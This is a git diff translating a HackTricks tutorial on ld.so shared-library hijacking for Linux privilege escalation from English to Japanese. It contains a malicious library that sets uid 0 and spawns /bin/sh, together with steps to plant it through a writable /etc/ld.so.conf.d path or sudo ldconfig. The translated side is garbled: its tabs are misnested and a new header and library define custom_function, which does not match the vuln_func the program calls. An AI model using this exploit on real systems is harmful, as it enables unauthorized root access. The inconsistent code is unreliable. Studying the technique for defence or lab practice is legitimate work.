@@ -1,20 +1,20 @@
-# ld.so privesc exploit example
+# ld.so特権昇格のエクスプロイト例
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式PEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
-## Prepare the environment
+## 環境の準備
 
-In the following section you can find the code of the files we are going to use to prepare the environment
+次のセクションでは、環境を準備するために使用するファイルのコードを見つけることができます。
 
 {% tabs %}
 {% tab title="sharedvuln.c" %}
@@ -23,65 +23,78 @@ In the following section you can find the code of the files we are going to use 
 #include "libcustom.h"
 
 int main(){
-    printf("Welcome to my amazing application!\n");
-    vuln_func();
-    return 0;
+printf("Welcome to my amazing application!\n");
+vuln_func();
+return 0;
 }
 ```
-{% endtab %}
-
 {% tab title="libcustom.h" %}
+
+```c
+#ifndef LIBCUSTOM_H
+#define LIBCUSTOM_H
+
+void custom_function();
+
+#endif
+```
+
+{% endtab %}
 ```c
 #include <stdio.h>
 
 void vuln_func();
 ```
-{% endtab %}
-
 {% tab title="libcustom.c" %}
+
+```c
+#include <stdio.h>
+
+void custom_function() {
+    printf("This is a custom function\n");
+}
+```
+
+このファイルは、`custom_function`という名前のカスタム関数を含んでいます。
 ```c
 #include <stdio.h>
 
 void vuln_func()
 {
-    puts("Hi");
+puts("Hi");
 }
 ```
+{% tabs %}
+{% tab title="Japanese" %}
+1. 同じフォルダにこれらのファイルを**作成**します
+2. **ライブラリ**を**コンパイル**します: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. `libcustom.so`を`/usr/lib`に**コピー**します: `sudo cp libcustom.so /usr/lib` (root権限)
+4. **実行可能ファイル**を**コンパイル**します: `gcc sharedvuln.c -o sharedvuln -lcustom`
+
+### 環境を確認する
+
+_libcustom.so_が_/usr/lib_から**ロード**されていること、およびバイナリを**実行**できることを確認します。
 {% endtab %}
 {% endtabs %}
-
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy** `libcustom.so` to `/usr/lib`: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
-
-### Check the environment
-
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
-
 ```
 $ ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
-	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
-	
-$ ./sharedvuln 
+linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
+libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)
+
+$ ./sharedvuln
 Welcome to my amazing application!
 Hi
 ```
-
 ## Exploit
 
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
-
+このシナリオでは、**誰かが`/etc/ld.so.conf/`内のファイルに脆弱なエントリを作成した**と仮定します。
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
-
-The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Download and compile** the following code inside that path:
-
+脆弱なフォルダは_/home/ubuntu/lib_です（書き込みアクセスがあります）。\
+次のコードをそのパス内に**ダウンロードしてコンパイル**してください：
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
 
@@ -90,89 +103,80 @@ The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
 #include <sys/types.h>
 
 void vuln_func(){
-    setuid(0);
-    setgid(0);
-    printf("I'm the bad library\n");
-    system("/bin/sh",NULL,NULL);
+setuid(0);
+setgid(0);
+printf("I'm the bad library\n");
+system("/bin/sh",NULL,NULL);
 }
 ```
+いま、誤構成されたパス内に**悪意のあるlibcustomライブラリを作成**したので、**再起動**またはrootユーザーが**`ldconfig`**を実行するのを待つ必要があります（_sudoでこのバイナリを実行できるか、またはsuidビットがある場合は自分で実行できます_）。
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
-
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
-
+これが起こった後、`sharevuln`実行ファイルが`libcustom.so`ライブラリをどこからロードしているかを**再確認**してください：
 ```c
 $ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007ffeee766000)
-	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
+linux-vdso.so.1 =>  (0x00007ffeee766000)
+libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-
-As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:
-
+次に示すように、**`/home/ubuntu/lib`から読み込んでいます**。ユーザーが実行すると、シェルが実行されます。
 ```c
-$ ./sharedvuln 
+$ ./sharedvuln
 Welcome to my amazing application!
 I'm the bad library
 $ whoami
 ubuntu
 ```
-
 {% hint style="info" %}
-Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
+この例では特権を昇格させていませんが、実行されるコマンドを変更し、**rootまたは他の特権ユーザーが脆弱なバイナリを実行するのを待つ**ことで特権を昇格させることができます。
 {% endhint %}
 
-### Other misconfigurations - Same vuln
+### 他の設定ミス - 同じ脆弱性
 
-In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+前の例では、管理者が`/etc/ld.so.conf.d/`内の設定ファイルに**特権のないフォルダを設定**したという設定ミスを偽装しました。\
+しかし、`/etc/ld.so.conf.d`内のいくつかの**設定ファイル**、`/etc/ld.so.conf.d`フォルダ、または`/etc/ld.so.conf`ファイルに**書き込み権限**がある場合、同じ脆弱性が発生する他の設定ミスがあります。
 
 ## Exploit 2
 
-**Suppose you have sudo privileges over `ldconfig`**.\
-You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
-So, lets create the files and folders needed to load "/tmp":
-
+**`ldconfig`に対してsudo特権を持っているとします**。\
+`ldconfig`に**どこからconfファイルをロードするか**を指定できるため、`ldconfig`が任意のフォルダをロードするように利用することができます。\
+では、"/tmp"をロードするために必要なファイルとフォルダを作成しましょう。
 ```bash
 cd /tmp
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-
-Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
-And finally, lets load the path and check where is the binary loading the library from:
-
+次に、**前のエクスプロイト**で示されたように、**`/tmp`内に悪意のあるライブラリを作成**します。\
+そして最後に、パスをロードしてバイナリがライブラリをどこからロードしているかを確認しましょう。
 ```bash
 ldconfig -f fake.ld.so.conf
 
 ldd sharedvuln
-	linux-vdso.so.1 =>  (0x00007fffa2dde000)
-	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
-	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
-	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
+linux-vdso.so.1 =>  (0x00007fffa2dde000)
+libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
+/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-
-**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.**
+**sudo権限を持つことで、同じ脆弱性を悪用することができます。**
 
 {% hint style="info" %}
-I **didn't find** a reliable way to exploit this vuln if `ldconfig` is configured with the **suid bit**. The following error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
+`ldconfig`が**suidビット**で設定されている場合、この脆弱性を悪用する信頼性のある方法は見つかりませんでした。次のエラーが表示されます：`/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
 {% endhint %}
 
-## References
+## 参考文献
 
 * [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
 * [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
-* Dab machine in HTB
+* HTBのDabマシン
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
